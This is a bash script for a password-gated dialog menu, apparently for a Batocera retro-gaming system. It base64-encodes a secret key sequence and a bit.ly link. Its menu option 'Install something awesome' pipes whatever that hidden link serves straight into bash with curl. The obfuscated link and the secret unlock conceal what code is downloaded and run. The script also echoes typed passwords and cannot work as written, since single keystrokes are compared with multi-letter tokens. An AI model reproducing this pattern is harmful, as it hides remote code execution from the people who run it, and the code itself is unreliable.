#!/bin/bash

# Encoded sequence (password)
encoded_sequence="VVAuVVAsRE9XTixET1dOLExFRlQsUklHSFQsTEVGVCxSSUdIVA=="
required_sequence=($(echo "$encoded_sequence" | base64 -d | tr ',' ' '))

# Encoded URL for Option 1
option1_url_encoded="Yml0Lmx5L0JhdG9jZXJhR0Q="
option1_url=$(echo "$option1_url_encoded" | base64 -d)

capture_input() {
    local input_sequence=()
    while [[ ${#input_sequence[@]} -lt ${#required_sequence[@]} ]]; do
        # Read user input non-blocking (1-second timeout)
        read -s -t 1 -n 1 input
        if [[ -n "$input" ]]; then
            input_sequence+=("$input")

            # Debugging: Log input and expected partial sequence
            echo "Current input: ${input_sequence[@]}"
            echo "Expected partial: ${required_sequence[@]:0:${#input_sequence[@]}}"

            # Incremental validation
            if [[ "${input_sequence[*]}" != "${required_sequence[*]:0:${#input_sequence[@]}}" ]]; then
                echo "Mismatch detected, resetting input..."
                input_sequence=()  # Reset on mismatch
            fi
        fi
    done

    # Final validation
    if [[ "${input_sequence[*]}" == "${required_sequence[*]}" ]]; then
        echo "Password accepted!" > /tmp/capture_result
    else
        echo "Access denied!" > /tmp/capture_result
    fi
}

show_menu() {
    while true; do
        input_password=$(dialog --passwordbox "Enter the password to access the menu:" 8 40 2>&1 >/dev/tty)

        # Debugging: Log the password attempt
        echo "Password entered: $input_password"

        # Check for the result from capture_input
        if [[ -f /tmp/capture_result && "$(cat /tmp/capture_result)" == "Password accepted!" ]]; then
            break
        else
            dialog --title "Incorrect" --msgbox "Waiting for the correct sequence..." 5 40
        fi
    done

    # Show the menu
    selected_option=$(dialog --menu "Password-Protected Menu" 15 70 3 \
        "BGD" "Install something awesome" \
        "Back" "Return to the main menu" 2>&1 >/dev/tty)

    case "$selected_option" in
        "BGD")
            echo "Downloading and running the script from: $option1_url"
            curl -Ls "$option1_url" | bash
            ;;
        "Back")
            echo "Returning to the main menu..."
            ;;
    esac
}

# Main execution flow
> /tmp/capture_result  # Clear previous result
capture_input &

show_menu

# Clean up temporary files
rm -f /tmp/capture_result
